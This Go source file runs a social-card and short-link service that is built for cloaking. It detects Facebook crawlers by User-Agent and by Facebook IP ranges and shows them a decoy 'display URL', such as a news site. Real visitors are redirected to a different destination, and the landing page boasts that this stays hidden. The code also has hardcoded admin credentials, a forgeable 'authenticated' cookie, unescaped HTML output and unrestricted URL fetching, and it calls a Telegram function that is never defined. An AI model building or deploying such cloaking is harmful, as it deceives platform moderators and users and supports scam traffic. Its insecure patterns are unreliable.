package main

import (
	"context"
	"crypto/sha256"
	"crypto/subtle"
	"fmt"
	"image"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/fogleman/gg"
	"github.com/go-redis/redis/v8"
	"github.com/joho/godotenv"
)

var (
	redisClient *redis.Client
	ctx         = context.Background()
	fbMatcher   *IPMatcher // Added Facebook IP matcher

	loginAttempts   = make(map[string]*loginAttempt)
	loginAttemptsMu sync.Mutex
)

// ----- New Handlers for Telegram Bot Integration & Admin Panel -----

// Global storage for allowed Telegram ChatIDs (in production persist these securely)
var (
	allowedChatIDs   = make(map[string]bool)
	allowedChatIDsMu sync.Mutex
)

type loginAttempt struct {
	Count       int
	LastAttempt time.Time
}

const (
	loginAttemptWindow = 1 * time.Minute
	maxLoginAttempts   = 5
)

// ----------------------------------
// Existing types and functions...
// ----------------------------------

// CIDRBlock represents a CIDR network block
type CIDRBlock struct {
	network net.IP
	maskLen int
}

// IPMatcher contains CIDR blocks for IP matching
type IPMatcher struct {
	cidrs []CIDRBlock
}

// NewMatcher creates a new IP matcher from a list of CIDR strings
func NewMatcher(cidrList []string) *IPMatcher {
	m := &IPMatcher{}
	for _, cidr := range cidrList {
		ip, ipNet, err := net.ParseCIDR(cidr)
		if err != nil {
			log.Printf("Error parsing CIDR %s: %v", cidr, err)
			continue
		}
		ones, _ := ipNet.Mask.Size()
		m.cidrPush(ip.To4(), ones)
	}
	return m
}

// cidrPush adds a CIDR block to the matcher
func (m *IPMatcher) cidrPush(ip net.IP, maskLen int) {
	m.cidrs = append(m.cidrs, CIDRBlock{ip.Mask(net.CIDRMask(maskLen, 32)), maskLen})
}

// Match checks if an IP address matches any of the CIDR blocks
func (m *IPMatcher) Match(ipStr string) bool {
	ipStr = strings.Split(ipStr, ":")[0]
	ip := net.ParseIP(ipStr).To4()
	if ip == nil {
		return false
	}
	for _, block := range m.cidrs {
		if block.network.Equal(ip.Mask(net.CIDRMask(block.maskLen, 32))) {
			return true
		}
	}
	return false
}

// Facebook CIDRs
var facebookCIDRs = []string{
	"31.13.24.0/21", "31.13.64.0/18", "31.13.88.0/21", "31.13.96.0/19",
	"31.13.128.0/17", "45.64.40.0/22", "66.220.0.0/16", "69.63.176.0/20",
	"69.171.0.0/16", "74.119.76.0/22", "102.132.96.0/20", "103.4.96.0/22",
	"129.134.0.0/16", "157.240.0.0/16", "173.252.64.0/18", "173.252.88.0/21",
	"173.252.96.0/19", "173.252.128.0/17", "179.60.192.0/22", "185.60.216.0/22",
	"185.89.216.0/22", "204.15.20.0/22", "209.237.244.0/23", "209.237.246.0/23",
	"209.237.248.0/23", "209.237.250.0/23", "131.108.0.0/22", "162.125.0.0/22",
	"199.201.64.0/22",
}

// Initialize random with a seed
func init() {
	rand.Seed(time.Now().UnixNano())
	err := godotenv.Load()
	if err != nil {
		log.Println("No .env file found, environment variables will be used")
	}
}

// Characters for short URL generation
const shortURLChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

// Generate a random short code
func generateShortCode(length int) string {
	code := make([]byte, length)
	for i := range code {
		code[i] = shortURLChars[rand.Intn(len(shortURLChars))]
	}
	return string(code)
}

// Create a short URL for a long URL
func createShortURL(longURL string) (string, error) {
	shortCode, err := redisClient.Get(ctx, "url:"+longURL).Result()
	if err == nil && shortCode != "" {
		return shortCode, nil
	}

	shortCode = generateShortCode(6)
	exists, err := redisClient.Exists(ctx, "short:"+shortCode).Result()
	if err != nil {
		return "", fmt.Errorf("Redis error: %v", err)
	}

	for exists > 0 {
		shortCode = generateShortCode(6)
		exists, err = redisClient.Exists(ctx, "short:"+shortCode).Result()
		if err != nil {
			return "", fmt.Errorf("Redis error: %v", err)
		}
	}

	pipe := redisClient.Pipeline()
	pipe.Set(ctx, "short:"+shortCode, longURL, 30*24*time.Hour)
	pipe.Set(ctx, "url:"+longURL, shortCode, 30*24*time.Hour)
	_, err = pipe.Exec(ctx)
	if err != nil {
		return "", fmt.Errorf("Failed to save short URL: %v", err)
	}

	return shortCode, nil
}

// ----------------------------
// New Authentication Functions
// ----------------------------

// Simple login credentials
const validUsername = "adminHUBE"
const validPassword = "AchaaAdminHaiTu@1122"

// Render login page form
func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		// If already logged-in, redirect to dashboard
		cookie, err := r.Cookie("session")
		if err == nil && cookie.Value == "authenticated" {
			http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
			return
		}
		html := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - realadlabs.in</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 50px; }
        form { max-width: 300px; margin: auto; padding: 20px; background: #fff; border-radius: 4px; }
        input { width: 100%; padding: 10px; margin: 5px 0; }
        button { width: 100%; padding: 10px; background: #3498db; color: #fff; border: 0; }
    </style>
</head>
<body>
    <h2 style="text-align:center;">Login</h2>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
</body>
</html>`
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprint(w, html)
		return
	}

	// POST: process login with rate limiting
	if err := r.ParseForm(); err != nil {
		http.Error(w, "Invalid form", http.StatusBadRequest)
		return
	}
	ip := getClientIP(r)
	loginAttemptsMu.Lock()
	attempt, exists := loginAttempts[ip]
	if !exists || time.Since(attempt.LastAttempt) > loginAttemptWindow {
		attempt = &loginAttempt{Count: 0, LastAttempt: time.Now()}
		loginAttempts[ip] = attempt
	}
	attempt.LastAttempt = time.Now()
	if attempt.Count >= maxLoginAttempts {
		loginAttemptsMu.Unlock()
		http.Error(w, "Too many login attempts. Please try again later.", http.StatusTooManyRequests)
		return
	}
	attempt.Count++
	loginAttemptsMu.Unlock()

	username := r.FormValue("username")
	password := r.FormValue("password")
	if subtle.ConstantTimeCompare([]byte(username), []byte(validUsername)) == 1 &&
		subtle.ConstantTimeCompare([]byte(password), []byte(validPassword)) == 1 {
		// Successful login: reset rate limit for this IP
		loginAttemptsMu.Lock()
		delete(loginAttempts, ip)
		loginAttemptsMu.Unlock()
		// Set session cookie
		http.SetCookie(w, &http.Cookie{
			Name:    "session",
			Value:   "authenticated",
			Expires: time.Now().Add(1 * time.Hour),
			Path:    "/",
		})
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}
	http.Error(w, "Invalid credentials", http.StatusUnauthorized)
}

// Protected dashboard handler with the social card form
func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	// Check authentication
	cookie, err := r.Cookie("session")
	if err != nil || cookie.Value != "authenticated" {
		http.Redirect(w, r, "/login", http.StatusSeeOther)
		return
	}
	html := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - realadlabs.in</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fdfdfd; padding: 20px; max-width: 800px; margin: auto; color: #333; }
        h1 { text-align: center; color: #2c3e50; }
        form { margin-top: 30px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
        button { padding: 10px 15px; background-color: #3498db; border: none; border-radius: 4px; color: #fff; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #2980b9; }
        .logout { text-align: right; margin-top: -10px; }
        .logout a { color: #e74c3c; text-decoration: none; font-weight: bold; }
        .logout a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="logout"><a href="/logout">Logout</a></div>
    <h1>Dashboard</h1>
    <p>Welcome! Use the form below to create your social media card securely.</p>
    <form method="POST" action="/create-card">
        <div class="form-group">
            <label for="siteUrl">Site URL <span style="color:#e74c3c;">*</span></label>
            <input type="text" id="siteUrl" name="siteUrl" placeholder="https://example.com" required>
        </div>
        <div class="form-group">
            <label for="imageUrl">Image URL <span style="color:#e74c3c;">*</span></label>
            <input type="text" id="imageUrl" name="imageUrl" placeholder="https://example.com/image.jpg" required>
        </div>
        <div class="form-group">
            <label for="title">Title (Optional)</label>
            <input type="text" id="title" name="title" placeholder="Your title here">
        </div>
        <div class="form-group">
            <label for="displayUrl">Display URL (Optional)</label>
            <input type="text" id="displayUrl" name="displayUrl" placeholder="https://display-url.com">
        </div>
        <div class="form-group" style="text-align:center;">
            <button type="submit">Create Card</button>
        </div>
    </form>
    <p style="text-align:center;"><a href="/">Back to Home</a></p>
</body>
</html>`
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, html)
}

// SEO-optimized landing page handler
func landingPageHandler(w http.ResponseWriter, r *http.Request) {
	html := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="keywords" content="social media card generator, shortlink generator, attach link with image, clickable image, smart redirection">
    <meta name="description" content="Discover a revolutionary platform that enhances your online engagement with seamless social media card creation and shortlink generation at realadlabs.in.">
    <meta name="author" content="realadlabs.in">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>realadlabs.in – Enhance Your Social Presence</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fafafa; padding: 20px; }
        .container { max-width: 800px; margin: auto; text-align: center; }
        h1 { color: #2c3e50; font-size: 2.5rem; }
        h2 { color: #34495e; }
        p { color: #555; line-height: 1.6; }
        a { color: #3498db; text-decoration: none; font-weight: bold; }
        a:hover { text-decoration: underline; }
        .features { margin-top: 30px; text-align: left; }
        .features li { margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>realadlabs.in</h1>
        <p>Experience a cutting‑edge online tool that helps you create visually engaging social media cards and streamlined shortlinks. Our platform harnesses advanced redirection and media attachment technology—all while keeping the intricate processes completely hidden.</p>
        <ul class="features">
            <li>Optimized social media previews</li>
            <li>Smart shortlink generation for effortless sharing</li>
            <li>Seamless integration with your website’s content</li>
            <li>High performance and secure processing</li>
        </ul>
        <p><a href="/login">Login to Get Started</a></p>
    </div>
</body>
</html>`
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, html)
}

// ----------------------------------
// Existing Server Functions (unchanged)
// ----------------------------------

func getClientIP(r *http.Request) string {
	forwardedFor := r.Header.Get("X-Forwarded-For")
	if forwardedFor != "" {
		ips := strings.Split(forwardedFor, ",")
		return strings.TrimSpace(ips[0])
	}
	return strings.Split(r.RemoteAddr, ":")[0]
}

func isBotOrEmulated(userAgent string) bool {
	fbAppIdentifiers := []string{"FBAV", "FBAN", "FB_IAB", "FBIOS", "Instagram", "messenger"}
	userAgent = strings.ToLower(userAgent)
	for _, fbApp := range fbAppIdentifiers {
		if strings.Contains(userAgent, strings.ToLower(fbApp)) {
			return false
		}
	}
	botAgents := []string{"facebookexternalhit", "metainspector", "twitterbot"}
	for _, bot := range botAgents {
		if strings.Contains(userAgent, strings.ToLower(bot)) {
			return true
		}
	}
	return false
}

func isFacebookIP(ip string) bool {
	return fbMatcher.Match(ip)
}

func generateHash(siteUrl, imageUrl, title, displayUrl string) string {
	data := siteUrl + imageUrl + title + displayUrl
	return fmt.Sprintf("%x", sha256.Sum256([]byte(data)))
}

func generateCard(siteUrl, imageUrl, title, displayUrl string) (string, error) {
	hash := generateHash(siteUrl, imageUrl, title, displayUrl)
	filename := filepath.Join("cards", hash+".png")
	if redisClient != nil {
		cachedPath, err := redisClient.Get(ctx, hash).Result()
		if err == nil && cachedPath != "" {
			if _, err := os.Stat(cachedPath); err == nil {
				return cachedPath, nil
			}
		}
	}
	if _, err := os.Stat(filename); err == nil {
		if redisClient != nil {
			redisClient.Set(ctx, hash, filename, 24*time.Hour)
		}
		return filename, nil
	}
	resp, err := http.Get(imageUrl)
	if err != nil {
		return "", fmt.Errorf("image fetch nahi hua: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("image fetch failed with status: %s", resp.Status)
	}
	img, _, err := image.Decode(resp.Body)
	if err != nil {
		return "", fmt.Errorf("image decode error: %v", err)
	}
	bounds := img.Bounds()
	origWidth := float64(bounds.Dx())
	origHeight := float64(bounds.Dy())
	maxWidth := 1200.0
	maxHeight := 630.0
	var newWidth, newHeight float64
	ratio := origWidth / origHeight
	if ratio > (maxWidth / maxHeight) {
		newWidth = maxWidth
		newHeight = maxWidth / ratio
	} else {
		newHeight = maxHeight
		newWidth = maxHeight * ratio
	}
	dc := gg.NewContext(int(newWidth), int(newHeight))
	dc.SetRGB(0.94, 0.94, 0.94)
	dc.Clear()
	dc.DrawImage(img, 0, 0)
	if title != "" {
		dc.SetRGB(0.2, 0.2, 0.2)
		fontPath := filepath.Join("fonts", "arial.ttf")
		if err := dc.LoadFontFace(fontPath, 40); err != nil {
			log.Printf("Warning: Cannot load font (%s). Using default font. Error: %v", fontPath, err)
		}
		dc.DrawStringAnchored(title, newWidth/2, origHeight+50, 0.5, 0.5)
	}
	dc.SetRGB(0.4, 0.4, 0.4)
	fontPath := filepath.Join("fonts", "arial.ttf")
	if err := dc.LoadFontFace(fontPath, 30); err != nil {
		log.Printf("Warning: Cannot load font (%s). Using default font. Error: %v", fontPath, err)
	}
	urlToDisplay := displayUrl
	if urlToDisplay == "" {
		urlToDisplay = siteUrl
	}
	dc.DrawStringAnchored(urlToDisplay, newWidth/2, newHeight-50, 0.5, 0.5)
	if err := dc.SavePNG(filename); err != nil {
		return "", fmt.Errorf("image save nahi hua: %v", err)
	}
	if redisClient != nil {
		err := redisClient.Set(ctx, hash, filename, 24*time.Hour).Err()
		if err != nil {
			log.Printf("Redis cache set failed: %v", err)
		}
	}
	return filename, nil
}

func isValidURL(url string) bool {
	return strings.HasPrefix(url, "http://") || strings.HasPrefix(url, "https://")
}

func generateCardHandler(w http.ResponseWriter, r *http.Request) {
	siteUrl := r.URL.Query().Get("siteUrl")
	imageUrl := r.URL.Query().Get("imageUrl")
	title := r.URL.Query().Get("title")
	displayUrl := r.URL.Query().Get("displayUrl")
	log.Printf("Generate request received: siteUrl=%s, imageUrl=%s", siteUrl, imageUrl)
	if siteUrl == "" || imageUrl == "" {
		http.Error(w, "Site URL aur Image URL dono chahiye!", http.StatusBadRequest)
		return
	}
	if !isValidURL(siteUrl) || !isValidURL(imageUrl) {
		http.Error(w, "URLs must start with http:// or https://", http.StatusBadRequest)
		return
	}
	if displayUrl != "" && !isValidURL(displayUrl) {
		http.Error(w, "Display URL must start with http:// or https://", http.StatusBadRequest)
		return
	}
	userAgent := r.Header.Get("User-Agent")
	clientIP := getClientIP(r)
	isBot := isBotOrEmulated(userAgent)
	isFB := isFacebookIP(clientIP)
	if !isBot {
		log.Printf("Redirecting real user to: %s", siteUrl)
		http.Redirect(w, r, siteUrl, http.StatusFound)
		return
	}
	if isBot || isFB {
		if displayUrl != "" {
			log.Printf("Redirecting bot to display URL: %s", displayUrl)
			http.Redirect(w, r, displayUrl, http.StatusFound)
			return
		}
	}
	filename, err := generateCard(siteUrl, imageUrl, title, displayUrl)
	if err != nil {
		log.Printf("Card generation error: %v", err)
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	log.Printf("Serving card image: %s", filename)
	w.Header().Set("Content-Type", "image/png")
	http.ServeFile(w, r, filename)
}

func previewHandler(w http.ResponseWriter, r *http.Request) {
	siteUrl := r.URL.Query().Get("siteUrl")
	imageUrl := r.URL.Query().Get("imageUrl")
	title := r.URL.Query().Get("title")
	displayUrl := r.URL.Query().Get("displayUrl")
	if siteUrl == "" || imageUrl == "" {
		http.Error(w, "Site URL aur Image URL dono chahiye!", http.StatusBadRequest)
		return
	}
	if !isValidURL(siteUrl) || !isValidURL(imageUrl) {
		http.Error(w, "URLs must start with http:// or https://", http.StatusBadRequest)
		return
	}
	if displayUrl != "" && !isValidURL(displayUrl) {
		http.Error(w, "Display URL must start with http:// or https://", http.StatusBadRequest)
		return
	}
	filename, err := generateCard(siteUrl, imageUrl, title, displayUrl)
	if err != nil {
		log.Printf("Preview error: %v", err)
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "image/png")
	http.ServeFile(w, r, filename)
}

// In shortURLHandler, instead of simply redirecting to the stored longURL,
// check if a final display URL is stored and if the requester is a bot.
func shortURLHandler(w http.ResponseWriter, r *http.Request) {
	shortCode := strings.TrimPrefix(r.URL.Path, "/s/")
	if shortCode == "" {
		http.Error(w, "Short code is required", http.StatusBadRequest)
		return
	}
	// Retrieve the stored card data. In our simple example, we assume that the value
	// stored is a URL query string with both the card generation endpoint and displayUrl.
	// In a real implementation, you would store displayUrl separately.
	cardQuery, err := redisClient.Get(ctx, "card:"+shortCode).Result()
	if err == redis.Nil {
		http.Error(w, "Short URL not found", http.StatusNotFound)
		return
	} else if err != nil {
		log.Printf("Redis error: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}

	// Parse the query parameters from the stored value.
	// For example, cardQuery might be:
	// "siteUrl=https://moneyonmind247.com&imageUrl=https://...&title=&displayUrl=https://www.aajtak.in"
	values, err := url.ParseQuery(cardQuery)
	if err != nil {
		http.Error(w, "Internal error parsing data", http.StatusInternalServerError)
		return
	}
	displayUrl := values.Get("displayUrl")
	finalRedirect := ""

	// If this is a bot/crawler request and a displayUrl is defined,
	// directly use that for redirect.
	userAgent := r.Header.Get("User-Agent")
	if isBotOrEmulated(strings.ToLower(userAgent)) && displayUrl != "" {
		finalRedirect = displayUrl
	} else {
		// Otherwise (for real users), redirect to your card generation endpoint.
		finalRedirect = "http://" + r.Host + "/generate-card?" + cardQuery
	}

	log.Printf("Redirecting to final URL: %s", finalRedirect)
	http.Redirect(w, r, finalRedirect, http.StatusFound)
}

func shortenURLHandler(w http.ResponseWriter, r *http.Request) {
	longURL := r.URL.Query().Get("url")
	if longURL == "" {
		http.Error(w, "URL parameter is required", http.StatusBadRequest)
		return
	}
	if redisClient == nil {
		http.Error(w, "URL shortening service is unavailable", http.StatusServiceUnavailable)
		return
	}
	shortCode, err := createShortURL(longURL)
	if err != nil {
		log.Printf("Error creating short URL: %v", err)
		http.Error(w, "Failed to create short URL", http.StatusInternalServerError)
		return
	}
	// Use the configured domain name: realadlabs.in
	host := "realadlabs.in"
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	shortURL := fmt.Sprintf("%s://%s/s/%s", scheme, host, shortCode)
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"short_url": "%s"}`, shortURL)
}

func createRequiredDirectories() {
	dirs := []string{"cards", "fonts"}
	for _, dir := range dirs {
		if err := os.MkdirAll(dir, 0755); err != nil {
			log.Fatalf("%s directory create nahi hua: %v", dir, err)
		}
	}
	fontPath := filepath.Join("fonts", "arial.ttf")
	if _, err := os.Stat(fontPath); os.IsNotExist(err) {
		log.Printf("Warning: Font file %s not found. Please add this file for proper text rendering.", fontPath)
	}
}

func setupRedis() {
	redisAddr := os.Getenv("REDIS_ADDR")
	if redisAddr == "" {
		redisAddr = "redis:6379"
	}
	redisClient = redis.NewClient(&redis.Options{
		Addr:     redisAddr,
		Password: os.Getenv("REDIS_PASSWORD"),
		DB:       0,
	})
	_, err := redisClient.Ping(ctx).Result()
	if err != nil {
		log.Printf("Warning: Redis connection failed: %v. Continuing without Redis caching.", err)
	} else {
		log.Println("Redis connection successful")
	}
}

func main() {
	// Initialize Facebook IP matcher, create directories, setup Redis, etc.
	fbMatcher = NewMatcher(facebookCIDRs)
	createRequiredDirectories()
	setupRedis()

	// Start the Telegram Bot in a separate goroutine
	go startTelegramBot()

	// Existing HTTP routes registration
	http.HandleFunc("/", landingPageHandler)
	http.HandleFunc("/login", loginHandler)
	http.HandleFunc("/dashboard", dashboardHandler)
	http.HandleFunc("/create-card", createCardHandler)
	http.HandleFunc("/generate-card", generateCardHandler)
	http.HandleFunc("/preview", previewHandler)
	http.HandleFunc("/s/", shortURLHandler)
	http.HandleFunc("/shorten", shortenURLHandler)
	http.Handle("/fonts/", http.StripPrefix("/fonts/", http.FileServer(http.Dir("fonts"))))
	http.Handle("/cards/", http.StripPrefix("/cards/", http.FileServer(http.Dir("cards"))))
	http.HandleFunc("/logout", logoutHandler)

	// New routes for Telegram bot integration & admin panel
	http.HandleFunc("/admin", adminPanelHandler)
	http.HandleFunc("/admin/add", adminAddHandler)
	// Bot panel route: users access via /bot?chat_id=YOUR_CHAT_ID
	http.HandleFunc("/bot", botPanelHandler)
	// Dummy bot option handlers
	http.HandleFunc("/bot/create-link", botCreateLinkHandler)
	http.HandleFunc("/bot/manage-link", botManageLinkHandler)
	http.HandleFunc("/bot/link-stats", botLinkStatsHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	log.Println("Server chal raha hai http://localhost:" + port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

// New handler to process card creation securely in the backend
func createCardHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}
	if err := r.ParseForm(); err != nil {
		http.Error(w, "Invalid form data", http.StatusBadRequest)
		return
	}
	siteUrl := r.FormValue("siteUrl")
	imageUrl := r.FormValue("imageUrl")
	title := r.FormValue("title")
	displayUrl := r.FormValue("displayUrl")
	// Validate essential URLs
	if siteUrl == "" || imageUrl == "" || !isValidURL(siteUrl) || !isValidURL(imageUrl) || (displayUrl != "" && !isValidURL(displayUrl)) {
		http.Error(w, "Invalid input – ensure required URLs are correct", http.StatusBadRequest)
		return
	}

	// Generate the card; the process remains secure on the server
	filename, err := generateCard(siteUrl, imageUrl, title, displayUrl)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error generating card: %v", err), http.StatusInternalServerError)
		return
	}

	// Construct the card URL and create a short URL for sharing
	baseURL := "http://" + r.Host
	cardUrl := fmt.Sprintf("%s/generate-card?siteUrl=%s&imageUrl=%s&title=%s&displayUrl=%s", baseURL, siteUrl, imageUrl, title, displayUrl)
	shortCode, err := createShortURL(cardUrl)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error creating short URL: %v", err), http.StatusInternalServerError)
		return
	}
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	shortURL := fmt.Sprintf("%s://%s/s/%s", scheme, "realadlabs.in", shortCode)

	// Render a results page without exposing any processing logic
	resultHTML := fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Card Generated - realadlabs.in</title>
    <style>
       body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; text-align: center; }
       .card-img { max-width: 100%%; height: auto; border: 1px solid #ddd; padding: 10px; background: #fff; }
       a { color: #3498db; text-decoration: none; }
       a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>Your Card is Ready</h1>
    <div>
       <img class="card-img" src="/cards/%s" alt="Social Media Card">
    </div>
    <p>Share this URL: <a href="%s">%s</a></p>
    <p><a href="/dashboard">Create another card</a></p>
</body>
</html>`, filepath.Base(filename), shortURL, shortURL)
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, resultHTML)
}

// New logoutHandler to clear session cookie and redirect to landing page.
func logoutHandler(w http.ResponseWriter, r *http.Request) {
	cookie := &http.Cookie{
		Name:    "session",
		Value:   "",
		Path:    "/",
		Expires: time.Unix(0, 0),
		MaxAge:  -1,
	}
	http.SetCookie(w, cookie)
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

// adminPanelHandler shows a form so that authenticated admin can add a Telegram ChatID.
func adminPanelHandler(w http.ResponseWriter, r *http.Request) {
	// Require authentication
	cookie, err := r.Cookie("session")
	if err != nil || cookie.Value != "authenticated" {
		http.Redirect(w, r, "/login", http.StatusSeeOther)
		return
	}
	html := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel - realadlabs.in</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fdfdfd; padding: 20px; max-width: 800px; margin: auto; color: #333; }
        h1 { text-align: center; }
        form { max-width: 400px; margin: auto; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { padding: 10px 15px; background: #3498db; color: #fff; border: 0; border-radius: 4px; cursor: pointer; }
        button:hover { background: #2980b9; }
        .logout { text-align: right; margin-bottom: 10px; }
        .logout a { color: #e74c3c; text-decoration: none; font-weight: bold; }
        .logout a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="logout"><a href="/logout">Logout</a></div>
    <h1>Admin Panel</h1>
    <p>Add a Telegram ChatID to grant bot access:</p>
    <form method="POST" action="/admin/add">
        <input type="text" name="chat_id" placeholder="Telegram ChatID" required>
        <button type="submit">Add ChatID</button>
    </form>
    <hr>
    <h3>Currently Allowed ChatIDs:</h3>
    <ul>`
	allowedChatIDsMu.Lock()
	for id := range allowedChatIDs {
		html += "<li>" + id + "</li>"
	}
	allowedChatIDsMu.Unlock()
	html += `</ul>
</body>
</html>`
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, html)
}

// adminAddHandler processes the form submission to add a new allowed Telegram ChatID.
func adminAddHandler(w http.ResponseWriter, r *http.Request) {
	// Require authentication
	cookie, err := r.Cookie("session")
	if err != nil || cookie.Value != "authenticated" {
		http.Redirect(w, r, "/login", http.StatusSeeOther)
		return
	}
	if r.Method != "POST" {
		http.Redirect(w, r, "/admin", http.StatusSeeOther)
		return
	}
	if err := r.ParseForm(); err != nil {
		http.Error(w, "Invalid form data", http.StatusBadRequest)
		return
	}
	chatID := r.FormValue("chat_id")
	if chatID == "" {
		http.Error(w, "ChatID required", http.StatusBadRequest)
		return
	}
	allowedChatIDsMu.Lock()
	allowedChatIDs[chatID] = true
	allowedChatIDsMu.Unlock()
	http.Redirect(w, r, "/admin", http.StatusSeeOther)
}

// botPanelHandler provides a dedicated panel with options for Telegram bot–enabled users.
// The bot (using your BOT_TOKEN stored in an environment variable) can simply pass the user ChatID (as query parameter).
func botPanelHandler(w http.ResponseWriter, r *http.Request) {
	chatID := r.URL.Query().Get("chat_id")
	if chatID == "" {
		http.Error(w, "chat_id query parameter required", http.StatusBadRequest)
		return
	}
	allowedChatIDsMu.Lock()
	allowed := allowedChatIDs[chatID]
	allowedChatIDsMu.Unlock()
	if !allowed {
		http.Error(w, "Access denied. Please contact admin.", http.StatusForbidden)
		return
	}
	html := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Bot Panel - realadlabs.in</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; max-width: 800px; margin: auto; color: #333; }
        h1 { text-align: center; }
        ul { list-style: none; padding: 0; }
        ul li { background: #fff; margin: 10px 0; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
        a { text-decoration: none; color: #3498db; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>Telegram Bot Panel</h1>
    <p>Welcome! Use the options below:</p>
    <ul>
        <li><a href="/bot/create-link?chat_id=` + chatID + `">Create Link</a></li>
        <li><a href="/bot/manage-link?chat_id=` + chatID + `">Manage Link</a></li>
        <li><a href="/bot/link-stats?chat_id=` + chatID + `">Link Stats</a></li>
    </ul>
</body>
</html>`
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, html)
}

// Dummy bot panel handlers (to be enhanced as needed)
func botCreateLinkHandler(w http.ResponseWriter, r *http.Request) {
	chatID := r.URL.Query().Get("chat_id")
	fmt.Fprintf(w, "Here you will be able to create a link. (chat_id: %s)", chatID)
}

func botManageLinkHandler(w http.ResponseWriter, r *http.Request) {
	chatID := r.URL.Query().Get("chat_id")
	fmt.Fprintf(w, "Here you will be able to manage your links. (chat_id: %s)", chatID)
}

func botLinkStatsHandler(w http.ResponseWriter, r *http.Request) {
	chatID := r.URL.Query().Get("chat_id")
	fmt.Fprintf(w, "Here you will be able to view your link statistics. (chat_id: %s)", chatID)
}
